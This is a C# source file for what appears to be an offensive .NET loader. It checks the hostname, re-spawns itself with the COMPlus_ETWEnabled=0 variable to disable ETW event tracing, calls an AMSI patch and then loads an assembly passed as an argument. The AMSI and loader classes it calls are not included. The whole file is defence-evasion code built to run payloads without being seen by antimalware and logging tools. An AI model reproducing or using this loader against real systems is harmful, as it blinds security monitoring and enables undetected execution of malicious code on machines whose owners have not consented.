using System;
using System.Diagnostics;
using System.Management;

namespace PositiveIntent
{
    public class Program
    {
        private static bool GetParentProcess()
        {
            int parentPid = 0;
            int ourPid = Process.GetCurrentProcess().Id;
            using (ManagementObject mo = new ManagementObject("win32_process.handle='" + ourPid.ToString() + "'"))
            {
                mo.Get();
                parentPid = Convert.ToInt32(mo["ParentProcessId"]);
            }
            if (Process.GetProcessById(parentPid).ProcessName == Process.GetCurrentProcess().ProcessName)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private static void CheckHostname()
        {
            if (System.Environment.MachineName != "TESTVM")
            {
                Environment.Exit(-1);
            }
        }
        private static void Fork(string args)
        {
            Process p = new Process();
            p.StartInfo.FileName = Process.GetCurrentProcess().ProcessName;
            p.StartInfo.Arguments = args;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.EnvironmentVariables["COMPlus_ETWEnabled"] = "0"; // neuter ETW
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            Console.WriteLine(p.StandardOutput.ReadToEnd());
            Console.WriteLine(p.StandardError.ReadToEnd());
            p.WaitForExit();
        }
        public static void Main(string[] args)
        {
            if (GetParentProcess())
            {
                AMSI.Patch();
                AssemblyHelper.LoadAssembly(args);
            }
            else if (args.Length != 0)
            {
                CheckHostname();
                Fork(string.Join(" ", args));
            }
        }
    }
}
